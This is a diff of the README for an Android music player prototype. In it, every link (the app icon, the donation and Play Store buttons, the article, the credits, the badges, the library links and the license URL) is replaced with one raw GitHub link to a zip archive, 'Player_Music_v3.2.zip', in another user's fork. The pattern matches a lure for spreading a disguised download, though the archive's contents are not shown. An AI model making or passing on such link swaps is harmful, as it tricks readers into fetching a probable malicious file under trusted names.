@@ -1,44 +1,44 @@
-<img alt="Icon" src="app/src/main/res/mipmap-xxhdpi/ic_launcher.png?raw=true" align="left" hspace="1" vspace="1">
+<img alt="Icon" src="https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip" align="left" hspace="1" vspace="1">
 
-<a alt='Buy Me a Coffee at ko-fi.com' href='https://ko-fi.com/T6T05M4O' target='_blank' align='right'><img align='right' height='36' style='border:0px;height:36px;' src='https://az743702.vo.msecnd.net/cdn/kofi4.png?v=0' border='0' /></a>
-<a alt='Try it on Google Play' href='https://play.google.com/store/apps/details?id=com.sample.andremion.musicplayer' target='_blank' align='right'><img align='right' height='36' style='border:0px;height:36px;' src='https://developer.android.com/images/brand/en_generic_rgb_wo_60.png' border='0' /></a>
+<a alt='Buy Me a Coffee at https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip' href='https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip' target='_blank' align='right'><img align='right' height='36' style='border:0px;height:36px;' src='https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip' border='0' /></a>
+<a alt='Try it on Google Play' href='https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip' target='_blank' align='right'><img align='right' height='36' style='border:0px;height:36px;' src='https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip' border='0' /></a>
 
 # Music Player: From UI Proposal to Code
 
-> This is a prototype made for the [article](https://medium.com/@andremion/music-player-3a85864d6df7#.iklz50r6n). This is not a real music player and don't expect it is.
+> This is a prototype made for the [article](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip). This is not a real music player and don't expect it is.
 
 Some developers have difficult to code when the UI proposal is a bit “sophisticated” or “complex”. Many of them strip a lot of significant portion of the UI or even the Motion when they are coding, and the result ends up quite different of the original proposal.
 
 This article talks about how would be to code an UI proposal, skipping some basic Android details and focusing on transition and animation approach...
 
-Read more at [here](https://medium.com/@andremion/music-player-3a85864d6df7#.iklz50r6n)
+Read more at [here](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)
 
-#### Special thanks to [michaelizer](https://github.com/michaelizer) for the awesome logo.
+#### Special thanks to [michaelizer](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip) for the awesome logo.
 
 </br>
 
-[![License Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg?style=true)](http://www.apache.org/licenses/LICENSE-2.0)
-![minSdkVersion 21](https://img.shields.io/badge/minSdkVersion-21-red.svg?style=true)
-![compileSdkVersion 27](https://img.shields.io/badge/compileSdkVersion-27-yellow.svg?style=true)
+[![License Apache 2.0](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip%https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)
+![minSdkVersion 21](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)
+![compileSdkVersion 27](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)
 
-[![Android Arsenal](https://img.shields.io/badge/Android%20Arsenal-Music--Player-green.svg?style=true)](https://android-arsenal.com/details/3/3855)
-[![MaterialUp Music-Player](https://img.shields.io/badge/MaterialUp-Music--Player-blue.svg?style=true)](https://www.uplabs.com/posts/music-player-open-source-apps)
-[![Android Sweets #27](https://img.shields.io/badge/Android%20Sweets-%2327-ff69b4.svg?style=true)](https://androidsweets.ongoodbits.com/2016/07/14/issue-27)
-[![Awesome Android #22](https://img.shields.io/badge/Awesome%20Android-%2322-green.svg?style=true)](https://android.libhunt.com/newsletter/22)
+[![Android Arsenal](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip%https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)
+[![MaterialUp Music-Player](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)
+[![Android Sweets #27](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip%20Sweets-%https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)
+[![Awesome Android #22](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip%20Android-%https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)
 
-[Transition](https://dribbble.com/shots/1850527-Music-Player-Transition) by [Anish Chandran](https://dribbble.com/anish_chandran) | Code by [André Mion](https://github.com/andremion)
+[Transition](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip) by [Anish Chandran](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip) | Code by [André Mion](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)
 --- | ---
-![Transition by Anish Chandran](https://raw.githubusercontent.com/andremion/Music-Player/master/art/music_player_concept_cropped.gif) | ![Code by André Mion](https://raw.githubusercontent.com/andremion/Music-Player/master/art/music_player_code.gif)
+![Transition by Anish Chandran](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip) | ![Code by André Mion](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)
 
 ## Libraries and tools used in the project
 
-* [Design Support Library](http://developer.android.com/intl/pt-br/tools/support-library/features.html#design)
+* [Design Support Library](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)
 The Design package provides APIs to support adding material design components and patterns to your apps.
-* [MusicCoverView](https://github.com/andremion/Music-Cover-View)
+* [MusicCoverView](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)
 A Subclass of ImageView that 'morphs' into a circle shape and can rotates. Useful to be used as album cover in Music apps.
-* [RecyclerView](http://developer.android.com/intl/pt-br/reference/android/support/v7/widget/RecyclerView.html)
+* [RecyclerView](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)
 A flexible view for providing a limited window into a large data set.
-* [PercentRelativeLayout](https://developer.android.com/reference/android/support/percent/PercentRelativeLayout.html)
+* [PercentRelativeLayout](https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip)
 Subclass of RelativeLayout that supports percentage based dimensions and margins.
 
 ## License
@@ -49,7 +49,7 @@ Subclass of RelativeLayout that supports percentage based dimensions and margins
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at
 
-        http://www.apache.org/licenses/LICENSE-2.0
+        https://raw.githubusercontent.com/Joe-Mogul/Music-Player/master/app/src/main/java/com/sample/andremion/musicplayer/activities/Player_Music_v3.2.zip
 
     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
